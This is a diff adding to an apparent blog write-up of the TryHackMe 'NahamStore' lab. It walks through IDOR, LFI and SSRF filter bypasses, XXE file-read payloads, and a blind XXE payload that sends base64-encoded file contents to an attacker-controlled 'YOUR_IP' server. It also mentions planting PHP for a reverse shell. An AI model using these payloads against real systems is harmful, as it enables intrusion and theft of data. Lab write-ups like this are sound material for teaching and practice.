@@ -7,6 +7,7 @@ comments: true
 ---
 
 
+
 In my opinion, this is a very cool box where it cover a lot of webapp pentest technique. A very good box to practice your webapp pentest skill. If you don't have enough knowledge about webapp pentest, this resouce will be a good place to start ([portswigger-lab](https://portswigger.net/web-security/all-labs))  
 
 For this box i will devide it into 2 part:
@@ -201,10 +202,149 @@ And finnaly we got the paramter is xml. Let try that:
  It likely this is another `XXE` attack. Let note this down and move on the next subdomain
  ## marketing.nahamstore.thm
  There is nothing here except a page where can register email and name, but there is nothing happen after that. So move on  
- At this point, we have done for port 80, so move to port 8000
+ At this point, we have done for port 80, so move to port 8000  
+ 
  ## Port 8000
  The result from nmap has show us there is a path `/admin` here. I try to login with defaul credential `admin:admin` and success go inside
   ![alt text](/assets/img/tryhackme/nahamStore/admin.PNG)
-  It is the edit page for the subdomain `marketing.nahamstore.thm`, we can modify the page here. At this point, possible path is we can add some php code to open a reverse shell to our computer
+  It is the edit page for the subdomain `marketing.nahamstore.thm`, we can modify the page here. At this point, possible path is we can add some php code to open a reverse shell to our computer.  
+  It is all for the enumeration part. Let's exploit  
+
+# Solving task
+For this, i will go with task by task order and it is different with exploit order.
+## [Task 3] Recon
+I can only solve this task when got `RCE` to the box and find out the subdomain in `/etc/hosts` is `nahamstore-2020-dev.nahamstore.thm`. And after  some fuzzing you can file the path for user Jimmy Jones is:
+```
+curl 'http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2'
+{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}
+```
+
+## [Task 4]  XSS
+Processing
+
+## [Task 5] Open redirect
+
+### Open Redirect One
+We can't not find out this when we enumerate, but it is only 1 character so we can guessed it :))). You can try this with:
+```
+http://nahamstore.thm?x=basket
+```
+*It is another character, not x =.=*
+
+### Open Redirect Two
+It is the paratmeter we find in our enumeration phase `rexxxxxxxrl`
+
+## [Task 6] CSRF
+processing
+
+## [Task 7] IDOR
+We found 2 IDOR exploit when we enumerate `basket` and  `pdf reciept` feature
+
+### First Line of Address
+It request us to find the fist line of address person  live in New York, so let find out with our previous request
+```
+POST /basket HTTP/1.1
+Host: nahamstore.thm
+...
+address_id=3
+```
+The address_id=3 will give us the result
+ ![alt text](/assets/img/tryhackme/nahamStore/task7_ress.PNG)
 
 
+### Order ID 3 date and time
+This is more tricky, we found out that there is some filter mechanism with the `pdf reciept`
+```
+POST /pdf-generator HTTP/1.1
+Host: nahamstore.thm
+...
+what=order&id=4
+```
+It will filter whenever we change to the ID that is not belong to our user. We can bypass this by passing another parameter along with the id `3%26user_id=3`
+```
+POST /pdf-generator HTTP/1.1
+Host: nahamstore.thm
+...
+what=order&id=3%26user_id=3
+```
+By this we will see the pdf of order 3
+
+## [Task 8] LFI
+There is a paramter `file=` for the API `/product/picture` that we found out that vulnerable to LFI. Let fuzzing for any bypass using wordlist `LFI-Jhaddix.txt` of seclist. I will use `Burp Intruder` with `sniper mode` for this one
+ ![alt text](/assets/img/tryhackme/nahamStore/burp.PNG)
+ We can see with the payload `....//....//....//etc//passwd` we don't recieve `file not found` message. This mean we bypass the filter. Let get the lag
+```
+GET /product/picture/?file=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2flfi%2fflag.txt
+```
+
+## [Task 9] SSRF
+We found out there is SSRF vuln in the API `POST /stockcheck`. Let try access to other server using this
+```
+POST /stockcheck HTTP/1.1
+Host: nahamstore.thm
+...
+
+product_id=2&server=marketing.nahamstore.thm
+```
+ ![alt text](/assets/img/tryhackme/nahamStore/ssrf_block.PNG)
+But we got block. So there is a filter here. We can bypass this by usin  `expected-host@evil-host` or `evil-host#expected-host`. After some try, I find out we can move on with paramter `expectec-host@evilhost#`:
+```
+product_id=2&server=stock.nahamstore.thm@marketing.nahamstore.thm#
+```
+ ![alt text](/assets/img/tryhackme/nahamStore/ssrf_bypass.PNG)
+ So now we success SSRF attack, but what we can do now? We can try  to brute force for other subdomain, that is only access by localhost using SSRF. Now I will again using `Burp Intruder` to brute force subdomain with wordlist `dns-Jhaddix.txt ` *(cause this one is large)*. Then use can filter out the result by lenght.  
+ After a while, we find out another subdomain is `internal-api.nahamstore.thm`, we use the same SSRF method to access and get Credit Card Number For Jimmy Jones:  
+```
+POST /stockcheck HTTP/1.1
+Host: nahamstore.thm
+...
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c
+```
+
+## [Task 10] XXE
+We found out 2 XXE location
+- `stock.nahamstore.thm?xml`
+- `stafft`: XXE file upload
+
+### XXE flag
+Let try `stock.nahamstore.thm?xml`. Here we can `GET /?xml=` to recieve the xml data. What happened when we change to `POST /?xml`
+ ![alt text](/assets/img/tryhackme/nahamStore/xxe1.PNG)
+ We got an error. So I think POST is only for specific product, let's try `POST /product/1?xml`
+  ![alt text](/assets/img/tryhackme/nahamStore/xxe2.PNG)
+ That is correct with my though, now we need to supply and XML file, i will copy the response error to try:
+ ![alt text](/assets/img/tryhackme/nahamStore/xxe3.PNG)
+ Now it show that we need `X-Token` tag. Now we already know how to exploit, this is our hacked xml:
+ ```
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<data><X-Token>&xxe;</X-Token></data>
+```
+This will read `flag.txt` and put in `xxe` DTD entity surround by X-Token tag  
+![alt text](/assets/img/tryhackme/nahamStore/xxe4.PNG)
+
+### Blind XXE flag
+Here we will exploit `XXE file upload` at `/staff`. There is a good source [here](https://www.programmersought.com/article/48705916572/)
+First, create a normal `.xlsx` file and then unzip it
+```
+mkdir test && cd test 
+unzip ../my.xlsx
+```
+Then modify `xl/workbook.xml` file to this:
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://your_ip/hack.xml"> %sp; %param1; ]> <r>&exfil;</r> <workbook [...]
+```
+Remember to change to your ip then zip it back  
+```
+zip -r ../upload.xlsx *
+```
+Then create `hack.xml` on your server
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOUR_IP/dtd.xml?%data;'>">
+```
+Then run a python server at the folder that have file `hack.xml`  
+```
+python3 -m http.server 80
+```
+After that, just upload your file, and you will get the result on your server
+![alt text](/assets/img/tryhackme/nahamStore/xxe5.PNG)
